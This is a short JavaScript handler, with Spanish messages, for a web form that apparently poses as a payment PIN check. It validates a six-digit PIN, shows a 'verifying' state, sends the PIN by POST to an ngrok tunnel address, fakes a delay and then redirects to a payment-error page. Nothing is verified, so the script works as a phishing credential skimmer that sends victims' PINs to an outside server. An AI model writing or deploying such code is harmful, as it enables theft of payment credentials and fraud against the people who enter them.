document.getElementById("pinForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const pin = document.getElementById("pinInput").value;
  const btn = document.getElementById("btnPin");
  const btnText = document.getElementById("pinButtonText");
  const toast = document.getElementById("toast");

  if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
    toast.innerText = "El PIN debe tener 6 dígitos numéricos.";
    toast.style.display = "block";
    setTimeout(() => toast.style.display = "none", 3000);
    return;
  }

  // Cambiar estado a cargando
  btn.disabled = true;
  btnText.textContent = "Verificando...";
  btn.classList.add("disabled");

  // Enviar PIN al servidor Flask (opcional)
  try {
    await fetch("https://e5c5-34-14-25-147.ngrok-free.app/pin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ pin: pin })
    });
  } catch (err) {
    console.warn("No se pudo enviar el PIN (modo local).");
  }

  // Simular tiempo de espera y redirigir a página de error
  setTimeout(() => {
    window.location.href = "error-pago.html";
  }, 2000);
});